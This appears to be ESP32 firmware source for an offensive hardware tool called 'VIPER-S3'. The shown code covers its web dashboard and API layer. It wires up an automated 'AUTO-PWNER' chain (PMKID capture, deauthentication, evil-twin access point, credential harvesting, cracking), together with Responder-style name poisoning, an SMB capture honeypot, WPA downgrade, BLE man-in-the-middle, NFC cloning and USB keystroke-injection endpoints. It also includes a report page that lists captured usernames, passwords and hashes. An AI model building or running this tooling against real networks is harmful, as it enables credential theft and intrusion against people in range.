    "fetch('/api/ai/twins/spawn',{method:'POST',body:JSON.stringify({index:parseInt(idx),duration:parseInt(dur)})})"
    "}"
    "function spawnAll(){"
    "var dur=document.getElementById('spawnDur').value;"
    "fetch('/api/ai/twins/spawn_all',{method:'POST',body:JSON.stringify({duration:parseInt(dur)})})"
    "}"
    "function refreshModels(){"
    "fetch('/api/ai/models').then(function(r){return r.json()}).then(function(d){"
    "var h='<table><tr><th>Model</th><th>Type</th><th>Samples</th></tr>';"
    "d.models.forEach(function(m){h+='<tr><td>'+m.name+'</td><td>'+m.type+'</td><td>'+m.samples+'</td></tr>'})"
    "h+='</table>';document.getElementById('aiModels').innerHTML=h"
    "})"
    "}"
    "function refreshHealth(){"
    "fetch('/api/orchestrator/health').then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('orchHealth').innerHTML="
    "'<div>Heap: '+d.heap_free+'KB (min: '+d.heap_min+'KB)</div>'"
    "+'<div>WiFi Mode: '+d.wifi_mode+'</div>'"
    "+'<div>BLE: '+(d.ble?'✓':'✗')+' Camera: '+(d.camera?'✓':'✗')+' USB: '+(d.usb?'✓':'✗')+'</div>'"
    "+'<div>Creds: '+d.creds+' Hashes: '+d.hashes+'</div>'"
    "+'<div>Chains Executed: '+d.chains+'</div>'"
    "+'<div>Uptime: '+d.uptime_ms+'ms</div>'"
    "})"
    "}"
    "function runChain(){"
    "var c=document.getElementById('chainSelect').value;"
    "fetch('/api/orchestrator/chain/run',{method:'POST',body:JSON.stringify({chain:parseInt(c)})}).then(function(){setTimeout(refreshHealth,1000)})"
    "}"
    "function stopChain(){"
    "fetch('/api/orchestrator/chain/stop',{method:'POST'}).then(function(){refreshHealth()})"
    "}"
    "function startSchedule(){"
    "var i=document.getElementById('schedInterval').value;"
    "var c=document.getElementById('chainSelect').value;"
    "fetch('/api/orchestrator/schedule',{method:'POST',body:JSON.stringify({interval_ms:parseInt(i),chain:parseInt(c)})})"
    "}"
    "function stopSchedule(){"
    "fetch('/api/orchestrator/schedule/stop',{method:'POST'})"
    "}"
    /* AUTO-PWNER JavaScript */
    "var autopwnCredCount=0,autopwnCrackedCount=0,autopwnClientCount=0;"
    "function startAutoPwner(){"
    "if(!confirm('Launch AUTO-PWNER? This will actively attack networks in range.'))return;"
    "var btn=document.getElementById('autopwnBtn');"
    "btn.disabled=true;btn.textContent='Running...';"
    "var steps=['scan','pmkid','deauth','evil_twin','harvest','crack'];"
    "steps.forEach(function(s){var el=document.getElementById('step-'+s);if(el){el.className='step-badge';} });"
    "autopwnCredCount=0;autopwnCrackedCount=0;autopwnClientCount=0;"
    "document.getElementById('autopwnCredCount').textContent='0';"
    "document.getElementById('autopwnCrackedCount').textContent='0';"
    "document.getElementById('autopwnClientCount').textContent='0';"
    "document.getElementById('autopwnLastPw').textContent='-';"
    "addAutopwnLog('\\u26A1 AUTO-PWNER launched','warn');"
    "fetch('/api/orchestrator/chain/run',{method:'POST',body:JSON.stringify({chain:5})});"
    "}"
    "function addAutopwnLog(msg,cls){"
    "var el=document.getElementById('autopwnLog');"
    "if(!el)return;"
    "var d=document.createElement('div');"
    "d.className=cls||'info';"
    "d.textContent='['+new Date().toLocaleTimeString()+'] '+msg;"
    "el.appendChild(d);"
    "el.scrollTop=el.scrollHeight;"
    "if(el.children.length===1&&el.children[0].textContent==='Waiting to start...')el.innerHTML='';"
    "el.appendChild(d);el.scrollTop=el.scrollHeight;"
    "}"
    /* Topology canvas engine */
    "var topoNodes=[];var topoLinks=[];"
    "function drawTopology(){"
    "var cv=document.getElementById('topoCanvas');if(!cv)return;"
    "var ctx=cv.getContext('2d');"
    "var W=cv.width,H=cv.height;"
    "ctx.clearRect(0,0,W,H);"
    /* Grid */
    "ctx.strokeStyle='#0d1520';ctx.lineWidth=1;"
    "for(var gx=0;gx<W;gx+=40){ctx.beginPath();ctx.moveTo(gx,0);ctx.lineTo(gx,H);ctx.stroke();}"
    "for(var gy=0;gy<H;gy+=40){ctx.beginPath();ctx.moveTo(0,gy);ctx.lineTo(W,gy);ctx.stroke();}"
    /* VIPER-S3 center node */
    "var cx=W/2,cy=H/2;"
    "ctx.shadowBlur=20;ctx.shadowColor='#00d4aa';"
    "ctx.beginPath();ctx.arc(cx,cy,18,0,Math.PI*2);"
    "ctx.fillStyle='#00d4aa';ctx.fill();"
    "ctx.shadowBlur=0;"
    "ctx.fillStyle='#0a0e17';ctx.font='bold 10px monospace';ctx.textAlign='center';ctx.textBaseline='middle';"
    "ctx.fillText('VIPER',cx,cy);"
    /* Draw APs */
    "topoNodes.forEach(function(n,i){"
    "var angle=(i/Math.max(topoNodes.length,1))*Math.PI*2-Math.PI/2;"
    "var r=n.targeted?130:160;"
    "var nx=cx+r*Math.cos(angle),ny=cy+r*Math.sin(angle);"
    "n._x=nx;n._y=ny;"
    /* Connection line */
    "ctx.beginPath();ctx.moveTo(cx,cy);ctx.lineTo(nx,ny);"
    "ctx.strokeStyle=n.targeted?'rgba(255,68,68,.6)':'rgba(68,136,255,.2)';"
    "ctx.lineWidth=n.targeted?2:1;ctx.setLineDash(n.targeted?[4,4]:[]);ctx.stroke();ctx.setLineDash([]);"
    /* AP circle */
    "ctx.shadowBlur=n.targeted?15:0;ctx.shadowColor='#ff4444';"
    "ctx.beginPath();ctx.arc(nx,ny,12,0,Math.PI*2);"
    "ctx.fillStyle=n.targeted?'#ff4444':'#4488ff';ctx.fill();"
    "ctx.shadowBlur=0;"
    /* Label */
    "ctx.fillStyle='#ccc';ctx.font='9px monospace';ctx.textAlign='center';ctx.textBaseline='top';"
    "ctx.fillText(n.ssid&&n.ssid.length>10?n.ssid.substring(0,10)+'..':n.ssid||'AP',nx,ny+14);"
    "ctx.fillStyle='#555';ctx.fillText('ch'+n.ch+' '+n.rssi+'dBm',nx,ny+24);"
    "});"
    "}"
    "function topoAddAp(ssid,ch,rssi,targeted){"
    "var ex=topoNodes.findIndex(function(n){return n.ssid===ssid});;"
    "if(ex>=0){topoNodes[ex].rssi=rssi;topoNodes[ex].targeted=targeted;}else{"
    "topoNodes.push({ssid:ssid,ch:ch,rssi:rssi,targeted:targeted||false});}"
    "drawTopology();"
    "}"
    "document.addEventListener('DOMContentLoaded',function(){"
    "var cv=document.getElementById('topoCanvas');"
    "if(cv){cv.addEventListener('click',function(){drawTopology();});}"
    "});"
    /* WebSocket event handler additions for autopwn/cracked */
    "function handleWsMessage(evt){"
    "try{var msg=JSON.parse(evt.data);}catch(e){return;}"
    "if(msg.type==='autopwn'){"
    "var d=typeof msg.data==='string'?JSON.parse(msg.data):msg.data;"
    "var step=d.step,status=d.status;"
    "addAutopwnLog(step+': '+status+(d.ssid?' ['+d.ssid+']':'')+(d.found?' found='+d.found:''),status==='active'?'warn':status==='done'?'cred':'info');"
    "var el=document.getElementById('step-'+step);"
    "if(el){el.className='step-badge '+(status==='active'?'active':status==='done'?'done':'info');}"
    "if(d.count){document.getElementById('autopwnClientCount').textContent=d.count;autopwnClientCount=d.count;}"
    "if(status==='captured'){autopwnCredCount++;document.getElementById('autopwnCredCount').textContent=autopwnCredCount;}"
    "if(step==='scan'&&status==='done'){topoNodes=[];}"
    "if(d.ssid&&step==='target'){topoAddAp(d.ssid,d.ch,d.rssi,true);}"
    "}"
    "if(msg.type==='cracked'){"
    "var d=typeof msg.data==='string'?JSON.parse(msg.data):msg.data;"
    "autopwnCrackedCount++;document.getElementById('autopwnCrackedCount').textContent=autopwnCrackedCount;"
    "document.getElementById('autopwnLastPw').textContent=d.password||'?';"
    "addAutopwnLog('\\u{1f513} CRACKED! Hash: '+d.hash+' Password: '+d.password,'cred');"
    "var el=document.getElementById('step-crack');if(el)el.className='step-badge cracked';"
    "}"
    "if(msg.type==='chain'){"
    "var d=typeof msg.data==='string'?JSON.parse(msg.data):msg.data;"
    "if(d.status==='done'){"
    "var btn=document.getElementById('autopwnBtn');"
    "if(btn){btn.disabled=false;btn.textContent='\u26A1 LAUNCH AUTO-PWNER';}"
    "addAutopwnLog('Chain complete: '+d.name,'info');"
    "}"
    "}"
    "}"
    /* Extend existing WS onmessage */
    "var _origWsMsg=null;"
    "function initTopoWs(){"
    "if(typeof ws!=='undefined'&&ws&&ws.onmessage){"
    "_origWsMsg=ws.onmessage;"
    "ws.onmessage=function(e){if(_origWsMsg)_origWsMsg(e);handleWsMessage(e);};"
    "}else{setTimeout(initTopoWs,500);}"
    "}"
    "setTimeout(initTopoWs,1000);"
    "</script></body></html>";

/* ── Root handler ───────────────────────────────── */

static esp_err_t root_get_handler(httpd_req_t *req)
{
    size_t html_len = sizeof(DASHBOARD_HTML) - 1;
    uint32_t free_pre = esp_get_free_heap_size();

    ESP_LOGI(TAG, "Serving dashboard HTML (%u bytes) — heap free: %lu KB",
             html_len, free_pre / 1024);

    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");

    /* Allocate from PSRAM to prevent SPI flash contention during large Wi-Fi send */
    char *buf = heap_caps_malloc(html_len, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    esp_err_t err;

    if (buf) {
        memcpy(buf, DASHBOARD_HTML, html_len);
        err = httpd_resp_send(req, buf, html_len);
        heap_caps_free(buf);
    } else {
        ESP_LOGW(TAG, "PSRAM full, sending dashboard from flash");
        err = httpd_resp_send(req, DASHBOARD_HTML, html_len);
    }

    uint32_t free_post = esp_get_free_heap_size();
    ESP_LOGI(TAG, "Dashboard served: %s (%u bytes) — heap: %lu->%lu KB",
             err == ESP_OK ? "OK" : "FAIL",
             html_len, free_pre / 1024, free_post / 1024);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send dashboard HTML: %s", esp_err_to_name(err));
        /* Do NOT send a fallback here! The headers are already sent. 
           Sending a fallback string will corrupt the HTTP stream and cause infinite loading. */
    }

    return err == ESP_OK ? ESP_OK : ESP_FAIL;
}

/* ── Simple ping endpoint ────────────────────────── */

static esp_err_t ping_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

/* ── Forward declarations for API handlers ───────── */

static esp_err_t api_responder_start(httpd_req_t *req);
static esp_err_t api_responder_stop(httpd_req_t *req);
static esp_err_t api_responder_status(httpd_req_t *req);
static esp_err_t api_smb_start(httpd_req_t *req);
static esp_err_t api_smb_stop(httpd_req_t *req);
static esp_err_t api_crack_start(httpd_req_t *req);
static esp_err_t api_crack_status(httpd_req_t *req);
static esp_err_t api_downgrade_start(httpd_req_t *req);
static esp_err_t api_canary_create(httpd_req_t *req);
static esp_err_t api_canary_list(httpd_req_t *req);
static esp_err_t api_behavioral_results(httpd_req_t *req);
static esp_err_t api_ble_proprietary(httpd_req_t *req);
static esp_err_t api_ble_mitm_start(httpd_req_t *req);
static esp_err_t api_ble_mitm_stop(httpd_req_t *req);
static esp_err_t api_ble_mitm_status(httpd_req_t *req);
static esp_err_t api_ble_mitm_services(httpd_req_t *req);
static esp_err_t api_ir_capture(httpd_req_t *req);
static esp_err_t api_ir_send(httpd_req_t *req);
static esp_err_t api_ir_learned(httpd_req_t *req);
static esp_err_t api_nfc_detect(httpd_req_t *req);
static esp_err_t api_nfc_clone(httpd_req_t *req);

/* ── Forward declarations: USB ──────────────────── */
static esp_err_t api_usb_status(httpd_req_t *req);
static esp_err_t api_usb_type(httpd_req_t *req);
static esp_err_t api_usb_release(httpd_req_t *req);
static esp_err_t api_usb_ducky(httpd_req_t *req);
static esp_err_t api_usb_payloads(httpd_req_t *req);

/* ── Forward declarations: AI ───────────────────── */
static esp_err_t api_ai_twins(httpd_req_t *req);
static esp_err_t api_ai_twins_delete(httpd_req_t *req);
static esp_err_t api_ai_twins_spawn(httpd_req_t *req);
static esp_err_t api_ai_twins_spawn_all(httpd_req_t *req);
static esp_err_t api_ai_models(httpd_req_t *req);

/* ── Forward declarations: Orchestrator ─────────── */
static esp_err_t api_orch_health(httpd_req_t *req);
static esp_err_t api_orch_chain_run(httpd_req_t *req);
static esp_err_t api_orch_chain_stop(httpd_req_t *req);
static esp_err_t api_orch_schedule(httpd_req_t *req);
static esp_err_t api_orch_schedule_stop(httpd_req_t *req);
static esp_err_t api_report(httpd_req_t *req);

/* ── API: Auth ────────────────────────────────────── */

static esp_err_t api_auth_login(httpd_req_t *req)
{
    char buf[128];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    char key[API_KEY_MAX_LEN] = {0};
    char *k = strstr(buf, "\"key\":");
    if (k) {
        k += 6;
        char *s = strchr(k, '"');
        if (s) {
            s++;
            int i = 0;
            while (*s && *s != '"' && i < API_KEY_MAX_LEN - 1) key[i++] = *s++;
        }
    }

    if (!s_auth_enabled || strcmp(key, s_api_key) == 0) {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"ok\":true}");
    } else {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_set_status(req, "401 Unauthorized");
        httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"invalid key\"}");
    }
    return ESP_OK;
}

/* ── URI Registration ───────────────────────────── */

static const httpd_uri_t s_uris[] = {
    { .uri = "/",         .method = HTTP_GET,    .handler = root_get_handler },
    { .uri = "/ping",     .method = HTTP_GET,    .handler = ping_get_handler },
    { .uri = "/ws",       .method = HTTP_GET,    .handler = ws_handler, .is_websocket = true },
    { .uri = "/api/auth", .method = HTTP_POST,   .handler = api_auth_login },
    { .uri = "/api/status",       .method = HTTP_GET,  .handler = api_status_get },
    { .uri = "/api/scan",         .method = HTTP_GET,  .handler = api_scan_get },
    { .uri = "/api/clients",      .method = HTTP_GET,  .handler = api_clients_get },
    { .uri = "/api/attack/start", .method = HTTP_POST, .handler = api_attack_start },
    { .uri = "/api/attack/stop",  .method = HTTP_POST, .handler = api_attack_stop },
    { .uri = "/api/captures/creds", .method = HTTP_GET, .handler = api_captures_creds },
    { .uri = "/api/captures/hashes",.method = HTTP_GET, .handler = api_captures_hashes },
    { .uri = "/api/captures/wipe",  .method = HTTP_POST,.handler = api_captures_wipe },
    { .uri = "/api/logs",         .method = HTTP_GET,  .handler = api_logs_get },
    { .uri = "/api/config",       .method = HTTP_GET,  .handler = api_config_get },
    { .uri = "/api/config",       .method = HTTP_POST, .handler = api_config_post },
    { .uri = "/stream",           .method = HTTP_GET,  .handler = stream_mjpeg },
    { .uri = "/api/download",     .method = HTTP_GET,  .handler = download_handler },
    { .uri = "/api/responder/start",  .method = HTTP_POST, .handler = api_responder_start },
    { .uri = "/api/responder/stop",   .method = HTTP_POST, .handler = api_responder_stop },
    { .uri = "/api/responder/status", .method = HTTP_GET,  .handler = api_responder_status },
    { .uri = "/api/smb/start",    .method = HTTP_POST, .handler = api_smb_start },
    { .uri = "/api/smb/stop",     .method = HTTP_POST, .handler = api_smb_stop },
    { .uri = "/api/crack/start",  .method = HTTP_POST, .handler = api_crack_start },
    { .uri = "/api/crack/status", .method = HTTP_GET,  .handler = api_crack_status },
    { .uri = "/api/downgrade/start", .method = HTTP_POST, .handler = api_downgrade_start },
    { .uri = "/api/canary/create",   .method = HTTP_POST, .handler = api_canary_create },
    { .uri = "/api/canary/list",     .method = HTTP_GET,  .handler = api_canary_list },
    { .uri = "/api/behavioral",      .method = HTTP_GET,  .handler = api_behavioral_results },
    { .uri = "/api/ble/proprietary", .method = HTTP_GET,  .handler = api_ble_proprietary },
    { .uri = "/api/ble/mitm/start",  .method = HTTP_POST, .handler = api_ble_mitm_start },
    { .uri = "/api/ble/mitm/stop",   .method = HTTP_POST, .handler = api_ble_mitm_stop },
    { .uri = "/api/ble/mitm/status", .method = HTTP_GET,  .handler = api_ble_mitm_status },
    { .uri = "/api/ble/mitm/services",.method = HTTP_GET,  .handler = api_ble_mitm_services },
    { .uri = "/api/ir/capture",   .method = HTTP_GET,  .handler = api_ir_capture },
    { .uri = "/api/ir/send",      .method = HTTP_POST, .handler = api_ir_send },
    { .uri = "/api/ir/learned",   .method = HTTP_GET,  .handler = api_ir_learned },
    { .uri = "/api/nfc/detect",   .method = HTTP_GET,  .handler = api_nfc_detect },
    { .uri = "/api/nfc/clone",    .method = HTTP_POST, .handler = api_nfc_clone },
    /* USB */
    { .uri = "/api/usb/status",   .method = HTTP_GET,  .handler = api_usb_status },
    { .uri = "/api/usb/type",     .method = HTTP_POST, .handler = api_usb_type },
    { .uri = "/api/usb/release",  .method = HTTP_POST, .handler = api_usb_release },
    { .uri = "/api/usb/ducky",    .method = HTTP_POST, .handler = api_usb_ducky },
    { .uri = "/api/usb/payloads", .method = HTTP_GET,  .handler = api_usb_payloads },
    /* AI */
    { .uri = "/api/ai/twins",          .method = HTTP_GET,  .handler = api_ai_twins },
    { .uri = "/api/ai/twins/delete",   .method = HTTP_POST, .handler = api_ai_twins_delete },
    { .uri = "/api/ai/twins/spawn",    .method = HTTP_POST, .handler = api_ai_twins_spawn },
    { .uri = "/api/ai/twins/spawn_all",.method = HTTP_POST, .handler = api_ai_twins_spawn_all },
    { .uri = "/api/ai/models",         .method = HTTP_GET,  .handler = api_ai_models },
    /* Orchestrator */
    { .uri = "/api/orchestrator/health",    .method = HTTP_GET,  .handler = api_orch_health },
    { .uri = "/api/orchestrator/chain/run", .method = HTTP_POST, .handler = api_orch_chain_run },
    { .uri = "/api/orchestrator/chain/stop",.method = HTTP_POST, .handler = api_orch_chain_stop },
    { .uri = "/api/orchestrator/schedule",     .method = HTTP_POST, .handler = api_orch_schedule },
    { .uri = "/api/orchestrator/schedule/stop",.method = HTTP_POST, .handler = api_orch_schedule_stop },
    { .uri = "/api/report",                    .method = HTTP_GET,  .handler = api_report },
};

/* ── API: HTML Session Report ──────────────────────────── */

/* Extract a JSON string field value from a JSONL line — C99 compatible */
static void jsonl_extract_field(const char *json, const char *key, char *out, size_t out_len)
{
    char kbuf[80];
    snprintf(kbuf, sizeof(kbuf), "\"%s\":\"", key);
    const char *p = strstr(json, kbuf);
    if (!p) { out[0] = '\0'; return; }
    p += strlen(kbuf);
    const char *e = strchr(p, '"');
    size_t l = e ? (size_t)(e - p) : strlen(p);
    if (l >= out_len) l = out_len - 1;
    memcpy(out, p, l);
    out[l] = '\0';
}

static esp_err_t api_report(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;

    uint32_t uptime_s  = (uint32_t)(esp_timer_get_time() / 1000000);
    uint32_t heap_kb   = esp_get_free_heap_size() / 1024;
    uint32_t heap_min  = esp_get_minimum_free_heap_size() / 1024;

    /* Read credentials */
    char *cred_buf = malloc(8192);
    char *hash_buf = malloc(8192);
    if (!cred_buf || !hash_buf) {
        free(cred_buf); free(hash_buf);
        httpd_resp_send_500(req);
        return ESP_OK;
    }
    size_t cred_len = 0, hash_len = 0;
    storage_read_file(FILE_CREDS,   (uint8_t *)cred_buf, 8191, &cred_len);
    storage_read_file(FILE_HASHES,  (uint8_t *)hash_buf, 8191, &hash_len);
    cred_buf[cred_len] = '\0';
    hash_buf[hash_len] = '\0';

    /* Count entries */
    int cred_count = 0, hash_count = 0;
    for (char *p = cred_buf; *p; p++) if (*p == '\n') cred_count++;
    for (char *p = hash_buf; *p; p++) if (*p == '\n') hash_count++;

    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=viper_session_report.html");

    /* Send header */
    httpd_resp_sendstr_chunk(req,
        "<!DOCTYPE html><html><head>"
        "<meta charset='utf-8'><title>VIPER-S3 Session Report</title>"
        "<style>*{box-sizing:border-box}body{font-family:'Segoe UI',system-ui,sans-serif;"
        "background:#0a0e17;color:#e0e0e0;margin:0;padding:24px}"
        ".hdr{background:linear-gradient(135deg,#0f1923,#1a2a3a);padding:24px;border-radius:8px;margin-bottom:20px}"
        ".hdr h1{color:#00d4aa;margin:0 0 8px}h1 span{color:#ff4444}"
        ".meta{color:#888;font-size:13px}"
        ".section{background:#111b24;border:1px solid #1a2a3a;border-radius:8px;padding:20px;margin-bottom:16px}"
        ".section h2{color:#00d4aa;font-size:16px;margin:0 0 12px;padding-bottom:8px;border-bottom:1px solid #1a2a3a}"
        "table{width:100%;border-collapse:collapse}th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #1a2a3a}"
        "th{color:#888;font-size:11px;text-transform:uppercase}td{color:#ccc;font-size:12px;font-family:monospace}"
        ".pill{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase}"
        ".pill-red{background:#2a0a0a;color:#ff4444}.pill-green{background:#0a2a0a;color:#00d4aa}"
        ".empty{color:#555;font-style:italic;font-size:13px}</style></head><body>");

    /* Header section */
    char hdr_buf[512];
    snprintf(hdr_buf, sizeof(hdr_buf),
        "<div class='hdr'><h1>VIPER<span>-S3</span> Session Report</h1>"
        "<div class='meta'>Generated: %lu s uptime &bull; "
        "Heap free: %lu KB (min: %lu KB) &bull; "
        "Credentials: %d &bull; Hashes: %d"
        "</div></div>",
        (unsigned long)uptime_s, (unsigned long)heap_kb, (unsigned long)heap_min,
        cred_count, hash_count);
    httpd_resp_sendstr_chunk(req, hdr_buf);

    /* Credentials section */
    httpd_resp_sendstr_chunk(req,
        "<div class='section'><h2>&#x1f511; Captured Credentials</h2>");
    if (cred_count == 0) {
        httpd_resp_sendstr_chunk(req, "<div class='empty'>No credentials captured this session.</div>");
    } else {
        httpd_resp_sendstr_chunk(req,
            "<table><tr><th>Source</th><th>Username</th><th>Password</th><th>IP</th><th>Timestamp</th></tr>");
        /* Walk JSONL */
        char *line = strtok(cred_buf, "\n");
        while (line) {
            if (line[0] == '{') {
                char row[512];
                char src[64], usr[64], pw[64], ip[32], ts[32];
                jsonl_extract_field(line, "source",    src, sizeof(src));
                jsonl_extract_field(line, "username",  usr, sizeof(usr));
                jsonl_extract_field(line, "password",  pw,  sizeof(pw));
                jsonl_extract_field(line, "ip",        ip,  sizeof(ip));
                jsonl_extract_field(line, "timestamp", ts,  sizeof(ts));
                snprintf(row, sizeof(row),
                    "<tr><td>%s</td><td style='color:#00d4aa'>%s</td>"
                    "<td style='color:#ff4444;font-weight:700'>%s</td><td>%s</td><td>%s</td></tr>",
                    src[0]?src:"?", usr[0]?usr:"?", pw[0]?pw:"?",
                    ip[0]?ip:"?", ts[0]?ts:"?");
                httpd_resp_sendstr_chunk(req, row);
            }
            line = strtok(NULL, "\n");
        }
        httpd_resp_sendstr_chunk(req, "</table>");
    }
    httpd_resp_sendstr_chunk(req, "</div>");

    /* Hashes section */
    httpd_resp_sendstr_chunk(req,
        "<div class='section'><h2>&#x1f513; Captured Hashes / PMKIDs</h2>");
    if (hash_count == 0) {
        httpd_resp_sendstr_chunk(req, "<div class='empty'>No hashes captured this session.</div>");
    } else {
        httpd_resp_sendstr_chunk(req, "<table><tr><th>Type</th><th>Hash</th><th>SSID</th></tr>");
        char *hline = strtok(hash_buf, "\n");
        while (hline) {
            if (hline[0] == '{') {
                char row[512];
                char type[32]={0}, hash[128]={0}, ssid[64]={0};
                const char *tp = strstr(hline, "\"type\":\"");
                if (tp) { tp += 8; const char *e=strchr(tp,'"'); size_t l=e?(size_t)(e-tp):0; if(l<sizeof(type)){memcpy(type,tp,l);type[l]='\0';} }
                const char *hp = strstr(hline, "\"hash\":\"");
                if (hp) { hp += 8; const char *e=strchr(hp,'"'); size_t l=e?(size_t)(e-hp):0; if(l<sizeof(hash)){memcpy(hash,hp,l);hash[l]='\0';} }
                const char *sp = strstr(hline, "\"ssid\":\"");
                if (sp) { sp += 8; const char *e=strchr(sp,'"'); size_t l=e?(size_t)(e-sp):0; if(l<sizeof(ssid)){memcpy(ssid,sp,l);ssid[l]='\0';} }
                snprintf(row, sizeof(row),
                    "<tr><td><span class='pill pill-red'>%s</span></td>"
                    "<td style='font-size:10px;color:#888;word-break:break-all'>%s</td>"
                    "<td style='color:#ffaa00'>%s</td></tr>",
                    type[0]?type:"unknown", hash[0]?hash:"?", ssid[0]?ssid:"?");
                httpd_resp_sendstr_chunk(req, row);
            }
            hline = strtok(NULL, "\n");
        }
        httpd_resp_sendstr_chunk(req, "</table>");
    }
    httpd_resp_sendstr_chunk(req, "</div>");

    /* Footer */
    httpd_resp_sendstr_chunk(req,
        "<div style='text-align:center;color:#333;font-size:11px;padding:16px'>"
        "VIPER-S3 &mdash; DEF CON Edition &mdash; For authorized security research only"
        "</div></body></html>");

    /* End chunked transfer */
    httpd_resp_sendstr_chunk(req, NULL);

    free(cred_buf);
    free(hash_buf);
    return ESP_OK;
}

/* ── API: Responder ─────────────────────────────── */

static esp_err_t api_responder_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len > 0) buf[len] = '\0';

    int proto = RESPONDER_ALL;
    if (strstr(buf, "\"proto\"")) {
        if (strstr(buf, "\"LLMNR\"")) proto = RESPONDER_LLMNR;
        else if (strstr(buf, "\"NBTNS\"")) proto = RESPONDER_NBTNS;
        else if (strstr(buf, "\"MDNS\"")) proto = RESPONDER_MDNS;
    }

    responder_start(proto);
    dashboard_log("Responder started (proto=%d)", proto);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_responder_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    uint32_t count = responder_get_poisoned_count();
    responder_stop();
    dashboard_log("Responder stopped (%lu poisoned)", count);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_responder_status(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[128];
    snprintf(buf, sizeof(buf), "{\"running\":%d,\"poisoned\":%lu}",
             responder_is_running(), responder_get_poisoned_count());
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, strlen(buf));
    return ESP_OK;
}

/* ── API: SMB Honey ─────────────────────────────── */

static esp_err_t api_smb_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    smb_honeypot_start(445);
    dashboard_log("SMB honeypot started");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_smb_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    smb_honeypot_stop();
    dashboard_log("SMB honeypot stopped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* ── API: Crack Engine ──────────────────────────── */

static esp_err_t api_crack_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[512];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    char hash[128] = {0}, wordlist[128] = {0};
    int type = 0;

    const char *h = strstr(buf, "\"hash\"");
    if (h) {
        h = strchr(h + 6, '"');
        if (h) { h++; int i = 0; while (*h && *h != '"' && i < 127) hash[i++] = *h++; }
    }
    const char *t = strstr(buf, "\"type\"");
    if (t) { t = strchr(t + 6, ':'); if (t) type = atoi(t + 1); }
    const char *w = strstr(buf, "\"wordlist\"");
    if (w) {
        w = strchr(w + 10, '"');
        if (w) { w++; int i = 0; while (*w && *w != '"' && i < 127) wordlist[i++] = *w++; }
    }

    if (!hash[0]) { httpd_resp_set_type(req, "application/json"); httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"no hash\"}"); return ESP_OK; }

    const char *wl = wordlist[0] ? wordlist : FILE_WORDLIST_10K;

    crack_result_t result;
    esp_err_t ret = crack_engine_crack(hash, (hash_type_t)type, wl, &result);

    char resp[256];
    snprintf(resp, sizeof(resp),
        "{\"ok\":%d,\"found\":%d,\"password\":\"%s\",\"attempts\":%lu,\"duration_ms\":%lu}",
        ret == ESP_OK, result.found, result.password,
        (unsigned long)result.attempts, (unsigned long)result.duration_ms);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, resp, strlen(resp));

    if (result.found) dashboard_log("Cracked: %s = '%s' (%u ms)", hash, result.password, result.duration_ms);
    else dashboard_log("Not cracked: %s (%u attempts)", hash, result.attempts);
    return ESP_OK;
}

static esp_err_t api_crack_status(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    uint32_t cracked, attempts;
    crack_engine_get_stats(&cracked, &attempts);

    char buf[128];
    snprintf(buf, sizeof(buf), "{\"cracked\":%lu,\"attempts\":%lu,\"ntlm_speed\":%lu,\"md5_speed\":%lu,\"sha1_speed\":%lu}",
             cracked, attempts,
             crack_engine_get_speed(HASH_TYPE_NTLM),
             crack_engine_get_speed(HASH_TYPE_MD5),
             crack_engine_get_speed(HASH_TYPE_SHA1));
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, strlen(buf));
    return ESP_OK;
}

/* ── API: Downgrade Engine ──────────────────────── */

static esp_err_t api_downgrade_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len > 0) buf[len] = '\0';

    char ssid[33] = "DowngradeAP";
    int ch = 6;
    const char *s = strstr(buf, "\"ssid\"");
    if (s) { s = strchr(s + 6, '"'); if (s) { s++; int i = 0; while (*s && *s != '"' && i < 32) ssid[i++] = *s++; } }

